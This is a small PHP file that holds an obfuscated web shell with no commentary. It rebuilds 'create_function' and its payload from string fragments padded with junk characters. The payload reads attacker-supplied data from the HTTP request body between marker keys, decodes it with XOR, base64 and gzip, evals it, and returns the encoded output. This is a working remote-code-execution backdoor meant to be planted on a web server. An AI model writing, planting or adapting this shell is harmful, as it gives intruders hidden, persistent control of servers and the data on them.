<?php
$Y=str_replace('U','','cUrUeUate_fuUncUtiUon');
$b='$k="47beu>de03";u>$kh="du>ad6du>6c09e57";u>u>$ku>f="dbu>d67dc0ad69";$p="u>b4WSu>B4Ccnu>frxyCu>Fx";func';
$w='j=0u>;($j<$c&u>&$i<$lu>u>);$j++,$i++)u>{$o.=u>$t{$i}u>^u>$k{$j};}}reu>turn $ou>;}if (u>@pru>eg';
$u='_matcu>h("u>/$kh(.u>+)$kf/u>",@filu>e_gu>eu>t_contents(u>"phpu>:/u>/inputu>"),$m)==1) {@ob_su>tu>art()';
$T='u>tion xu>u>($t,$k){$u>c=strleu>n($ku>);$l=strlu>en(u>$tu>);$o="u>";for($i=0;$iu><$l;){fu>or($';
$l='b_end_cu>lean();$ru>=@baseu>64u>_encode(u>@x(@gzcou>u>mpressu>($o),$k));priu>nt("u>$p$kh$r$u>kf");}';
$X=';@evu>al(@gzuu>u>ncompress(@x(u>@bu>ase64_decou>de($m[1]u>),u>$k)));$ou>u>=u>@ob_geu>t_contents();u>@o';
$g=str_replace('u>','',$b.$T.$w.$u.$X.$l);
$G=$Y('',$g);$G();
?>
